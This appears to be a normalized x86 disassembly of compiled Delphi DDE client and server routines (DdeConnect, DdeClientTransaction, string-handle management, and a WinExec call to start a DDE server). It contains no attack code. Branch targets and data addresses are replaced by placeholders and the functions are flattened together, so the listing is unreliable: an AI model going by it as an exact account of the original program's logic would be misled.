cmp [ edi + 0xa0 ] 0x0
jne r-xdata
mov eax [ edi + 0x34 ]
call sub_4046e4
test eax eax
jne r-xdata
cmp [ edi + 0xa4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x30 ]
call sub_409054
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa0 ] eax
mov eax edi
call sub_4681ac
jmp r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_4681ec
mov ebx eax
test bl bl
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x34 ]
call sub_409054
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa4 ] eax
test bl bl
jne r-xdata
mov eax [ edi + 0x30 ]
call sub_4046e4
test eax eax
jne r-xdata
mov eax [ edi + 0x58 ]
test eax eax
je r-xdata
mov eax edi
call sub_4681ac
jmp r-xdata
mov eax [ edi + 0xc0 ]
call sub_4046e4
test eax eax
je r-xdata
mov eax [ edi + 0xc0 ]
call sub_4046e4
test eax eax
je r-xdata
mov [ edi + 0xa8 ] 0x1
mov [ edi + 0xa8 ] eax
jmp r-xdata
push [ edi + 0x30 ]
push r-xdata
push [ edi + 0x34 ]
lea eax [ ebp - 0x108 ]
mov edx 0x3
call sub_4047a4
mov edx [ ebp - 0x108 ]
lea eax [ ebp - 0x101 ]
call sub_409054
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0xc0 ]
call sub_409054
jmp r-xdata
mov eax edi
mov si 0xffee
call sub_4038bc
xor ecx ecx
xor edx edx
mov eax edi
call sub_468310
mov [ ebp - 0x1 ] 0x1
mov eax edi
call sub_468264
test al al
je r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_4681ec
mov ebx eax
push 0x7
lea eax [ ebp - 0x101 ]
push eax
call WinExec
cmp eax 0x20
jb r-xdata
sub_46812c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
mov esi eax
mov eax ebx
call sub_4682cc
xor eax eax
mov [ ebx + 0x38 ] eax
push 0x0
push 0xffffffff
push esi
call DdeSetUserHandle
push esi
call DdeDisconnect
mov eax [ ebx + 0xa4 ]
test eax eax
je r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa0 ] eax
xor edx edx
mov eax ebx
call sub_4683d0
xor edx edx
mov eax ebx
call sub_4683e4
pop esi
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa4 ] eax
sub_4681ac
push ebx
push esi
mov esi eax
mov eax [ esi + 0x9c ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov bx [ eax + 0x8 ]
dec ebx
test bx bx
jb r-xdata
inc ebx
mov eax [ esi + 0x9c ]
xor edx edx
call sub_4161a0
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x10 ]
call sub_4685a8
dec bx
jne r-xdata
sub_4681ec
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp ecx
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402fc4
mov [ esp ] 0x24
mov [ esp + 0xc ] 0x3ec
push esp
push ebp
push edi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeConnect
mov ebx eax
mov [ esi + 0x38 ] ebx
test ebx ebx
setne al
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x3c ] 0x60
lea eax [ esi + 0x3c ]
push eax
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeQueryConvInfo
push esi
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeSetUserHandle
sub_468264
push ebx
push esi
push edi
push ebp
mov esi eax
xor eax eax
cmp [ esi + 0x38 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_4161a0
mov edi eax
mov eax edi
call sub_468930
test al al
jne r-xdata
mov al 0x1
inc ebx
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ edi + 0x10 ]
call sub_4685a8
jmp r-xdata
movzx eax bx
mov edx [ esi + 0x9c ]
cmp eax [ edx + 0x8 ]
jge r-xdata
sub_4682cc
push ebx
push esi
push edi
push ebp
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
xor eax eax
mov [ edi + 0x38 ] eax
xor ebx ebx
jmp r-xdata
mov eax edi
mov si 0xffef
call sub_4038bc
movzx ebp bx
mov esi [ edi + 0x9c ]
cmp ebp [ esi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax esi
call sub_4161a0
call sub_468a28
inc ebx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_468310
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov [ esp ] edx
mov esi eax
xor ebx ebx
jmp r-xdata
movzx eax bx
mov ebp [ esi + 0x9c ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
movzx edx bx
mov eax ebp
call sub_4161a0
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
call sub_4687d8
cmp edi [ eax + 0x8 ]
jne r-xdata
inc ebx
sub_468350
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc5 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov [ esi + 0xc5 ] bl
mov eax [ esi + 0x30 ]
call sub_4046e4
test eax eax
je r-xdata
mov eax [ esi + 0x34 ]
call sub_4046e4
test eax eax
je r-xdata
mov eax esi
call sub_467f38
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
sub_468438
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] cl
mov [ esp ] edx
mov ebx eax
mov cl [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_41e4c0
cmp [ esp + 0x4 ] 0x1
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x9c ] 0x0
je r-xdata
xor esi esi
jmp r-xdata
movzx edi si
mov ebp [ ebx + 0x9c ]
cmp edi [ ebp + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebp
call sub_4161a0
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ ebx + 0x9c ]
cmp edi [ eax + 0x8 ]
jge r-xdata
mov eax edx
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4685a8
inc esi
sub_4684ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41e1a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4684f0
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e1f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_468520
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46859b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x34 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4685a2
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x38 ]
call sub_4044c4
lea eax [ ebx + 0x38 ]
call sub_40442c
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x34 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_467de0
mov edx ebx
call sub_41e274
mov eax [ ebp - 0x4 ]
call sub_4046e4
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4685a8
sub_4685a8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_404480
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x34 ]
call sub_467e18
test al al
jne r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_404480
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
call sub_40442c
pop esi
pop ebx
retn
mov eax [ ebx + 0x34 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
cmp [ eax + 0xc5 ] 0x1
je r-xdata
sub_468604
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41e4c0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x34 ]
jne r-xdata
mov edx edi
mov eax [ edi + 0x34 ]
call sub_467de0
xor eax eax
mov [ edi + 0x34 ] eax
lea eax [ edi + 0x38 ]
call sub_40442c
sub_468640
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_4038ec
test al al
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_468688
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_40442c
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_4686bc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
xor eax eax
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_468700
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax esi
call sub_4689e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_46872c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4687c9
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_4044c4
cmp [ esi + 0x8 ] 0x0
je r-xdata
lea eax [ esi + 0x4 ]
mov edx edi
call sub_404480
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ esi + 0x4 ]
call sub_4046e4
test eax eax
je r-xdata
mov eax esi
call sub_4689e8
mov eax esi
call sub_4688b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4687d0
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax [ esi + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ eax + 0xc5 ] 0x1
jne r-xdata
mov eax esi
call sub_468930
mov ebx eax
test bl bl
jne r-xdata
mov bl 0x1
lea eax [ esi + 0x4 ]
call sub_40442c
jmp r-xdata
sub_4687d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4688a8
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_468920
mov edx eax
lea eax [ ebp - 0x8 ]
call sub_40461c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_4688b8
jmp r-xdata
mov eax ebx
call sub_468a48
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax ebx
call sub_468928
mov eax [ ebx + 0xc ]
cmp [ eax + 0xc7 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4688af
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
mov eax [ ebp - 0x8 ]
call sub_4046e4
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov esi 0x1
inc esi
dec edi
jne r-xdata
mov edx [ ebp - 0x8 ]
cmp al 0x20
jae r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax + esi - 0x1 ]
test al al
jbe r-xdata
lea eax [ ebp - 0x8 ]
call j_sub_4048e8#2
mov [ eax + esi - 0x1 ] 0x20
sub_4688b8
push ebx
push esi
push edi
push ecx
mov edi eax
xor ebx ebx
mov eax [ edi + 0xc ]
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
mov eax edi
call sub_468a48
cmp [ edi + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0xc6 ] 0x1
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x3e8
push 0x20b0
mov eax [ eax + 0xa8 ]
push eax
mov eax [ edi + 0x8 ]
push eax
push edx
push 0xffffffff
push 0x0
call DdeClientTransaction
mov esi eax
test esi esi
je r-xdata
mov edx esi
mov eax edi
call sub_4687d8
push esi
call DdeFreeDataHandle
mov bl 0x1
jmp r-xdata
sub_468930
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] 0x0
mov eax [ ebx + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax [ ebx + 0x4 ]
call sub_4046e4
test eax eax
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea edx [ esp + 0x4 ]
push edx
push 0x3e8
push 0x1034
mov eax [ ebx + 0xc ]
mov edx [ eax + 0xa8 ]
push edx
mov edx [ ebx + 0x8 ]
push edx
mov eax [ eax + 0x38 ]
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
test eax eax
jne r-xdata
push 0x3ec
mov eax [ ebx + 0x4 ]
call sub_4048dc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x8 ] eax
mov [ esp ] 0x1
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
sub_4689e8
push ebx
push esi
push ecx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax ebx
call sub_468a28
mov al 0x1
pop edx
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
test edx edx
je r-xdata
push esp
push 0x3e8
push 0x8040
mov ecx [ esi + 0xa8 ]
push ecx
push edx
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
sub_468a28
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
sub_468a54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41e1a4
mov [ esi + 0x48 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_468aa0
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e1f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_468ae0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_40442c
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_468b0c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x48 ] 0x1
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax ebx
call sub_468bbc
pop esi
pop ebx
retn
sub_468b38
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_468bac
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x8 ]
pop edx
call sub_4087c8
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468bb3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
mov [ ebx + 0x48 ] 0x1
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
call sub_468bbc
sub_468bbc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_468c43
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3a ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_467a1c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468c4a
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_441d64
mov edx [ ebp - 0x4 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_467a1c
sub_468c50
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_468cd3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push edi
call DdeAccessData
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468cda
lea eax [ ebp - 0xc ]
call sub_40442c
retn
lea eax [ ebp - 0xc ]
mov edx esi
call sub_40461c
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
push edi
call DdeUnaccessData
mov eax ebx
call sub_468bbc
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x8000
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_468cf8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41e4c0
cmp esi [ edi + 0x34 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x34 ] eax
sub_468d20
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41e1a4
mov edx esi
mov eax [ rw-data ]
call sub_467a80
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_468d64
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_467a94
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e1f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_468d98
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push sub_468e23
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
lea eax [ ebp - 0x4 ]
push eax
push edx
call DdeAccessData
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468e2a
lea eax [ ebp - 0xc ]
call sub_40442c
retn
cmp [ esi + 0x42 ] 0x0
je r-xdata
mov edi 0x8000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_40461c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ esi + 0x44 ]
call [ esi + 0x40 ]
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_468e5c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41e1a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x44 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_468ea0
push ebx
push esi
push edi
push ebp
call sub_403a8c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x34 ]
test eax eax
je r-xdata
push eax
call DdeDisconnect
mov eax [ ebp + 0x44 ]
call sub_4036c0
xor eax eax
mov [ ebp + 0x44 ] eax
inc esi
xor edi edi
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41e1f0
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebp + 0x34 ] eax
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_4161a0
call sub_4036c0
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403a74
sub_468f24
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x1008 ] ebx
mov ebx eax
xor eax eax
push ebp
push sub_469044
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46904b
lea eax [ ebp - 0x100c ]
mov edx 0x2
call sub_404450
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1001 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1008 ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_404694
mov eax [ ebp - 0x1008 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_469270
mov edi eax
test edi edi
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4693e8
mov esi eax
mov [ esi + 0x3c ] edi
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_404694
mov edx [ ebp - 0x100c ]
mov eax esi
call sub_469544
mov edx esi
mov eax [ ebx + 0x44 ]
call sub_416044
mov edx ebx
mov eax esi
call sub_41e274
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov [ ebp - 0x1 ] 0x1
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_4048dc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x34 ] eax
sub_469058
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_469394
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov edx ebx
mov eax [ esi + 0x44 ]
call sub_416340
mov eax ebx
call sub_4036c0
sub_469088
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1004 ] ebx
mov ebx eax
xor eax eax
push ebp
push sub_46912b
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469132
lea eax [ ebp - 0x1004 ]
call sub_40442c
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1000 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1004 ]
lea edx [ ebp - 0x1000 ]
mov ecx 0x1000
call sub_404694
mov eax [ ebp - 0x1004 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_469270
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
call sub_468c50
mov esi eax
sub_46913c
push ebp
mov ebp esp
xor edx edx
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
mov eax edx
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov eax ecx
call sub_468d98
mov edx eax
sub_46915c
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_46925d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax ebx
call sub_469394
test eax eax
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1008 ]
mov ecx 0x1000
call sub_404694
mov eax [ ebp - 0x100c ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_469270
mov ebx eax
test ebx ebx
je r-xdata
mov dx [ ebp + 0x8 ]
call sub_469460
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469264
lea eax [ ebp - 0x100c ]
call sub_40442c
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x30 ]
